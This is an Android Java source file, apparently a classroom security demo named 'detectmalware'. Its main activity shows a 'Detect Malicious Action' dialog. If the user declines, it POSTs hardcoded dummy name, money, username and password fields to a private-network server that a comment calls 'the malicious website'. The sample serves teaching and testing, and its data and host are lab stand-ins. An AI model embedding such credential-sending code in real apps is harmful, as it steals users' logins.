package com.example.detectmalware;

import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.support.v7.app.ActionBarActivity;
import android.support.v7.app.ActionBar;
import android.support.v4.app.Fragment;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.os.Build;

@TargetApi(Build.VERSION_CODES.GINGERBREAD) @SuppressLint("NewApi") public class MainActivity extends ActionBarActivity {

    @TargetApi(Build.VERSION_CODES.GINGERBREAD) @SuppressLint("NewApi") @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .add(R.id.container, new PlaceholderFragment())
                    .commit();
        }
        //this.alertInternet();
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        this.alertInternet("http package");
    }

   

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    // send information to the malicious website
    protected void sendInformation(){
        try {
        	HttpClient httpclient = new DefaultHttpClient();
        	HttpPost httppost = new HttpPost("http://10.0.0.12:80/computersecurity/test.php");     
            // Add your data
            List<BasicNameValuePair> nameValuePairs = new ArrayList<BasicNameValuePair>(4);
            nameValuePairs.add(new BasicNameValuePair("name", "Oliver"));
            nameValuePairs.add(new BasicNameValuePair("money", "1000"));
            nameValuePairs.add(new BasicNameValuePair("username", "o12@gmail.com"));
            nameValuePairs.add(new BasicNameValuePair("password", "wordpass"));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            // Execute HTTP Post Request
            HttpResponse response = httpclient.execute(httppost);

        } catch (ClientProtocolException e) {
            // TODO Auto-generated catch block
            this.alertInternet(e.getClass().toString()+e.getMessage());
        } catch (Exception e) {
        	this.alertInternet(e.getClass().toString()+e.getMessage());
            // TODO Auto-generated catch block
        }
    }
    // alert for the internet access
    protected void alertInternet(String temp){
 	   AlertDialog.Builder builder = new AlertDialog.Builder(this);

 	   // 2. Chain together various setter methods to set the dialog characteristics
 	   builder.setMessage("Do you want to stop it? "+temp)
 	          .setTitle("Detect Malicious Action")
	   		  .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
	        public void onClick(DialogInterface dialog, int which) { 
	            // continue with delete
	        }
	     })
	 	    .setNegativeButton(android.R.string.no, new DialogInterface.OnClickListener() {
	 	        public void onClick(DialogInterface dialog, int which) { 
	 	            // do nothing
	 	        	sendInformation();
	 	        }
	 	     });
 	   // 3. Get the AlertDialog from create()
 	   AlertDialog dialog = builder.create();
 	   dialog.show();
    }
    
   @Override
    protected void onStop() {
    // TODO Auto-generated method stub
	   super.onStop();
	   Log.v("BACKGROUND", "Background Run");
	// 1. Instantiate an AlertDialog.Builder with its constructor

    }
    /**
     * A placeholder fragment containing a simple view.
     */
    public static class PlaceholderFragment extends Fragment {

        public PlaceholderFragment() {
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.fragment_main, container, false);
            return rootView;
        }
    }

}
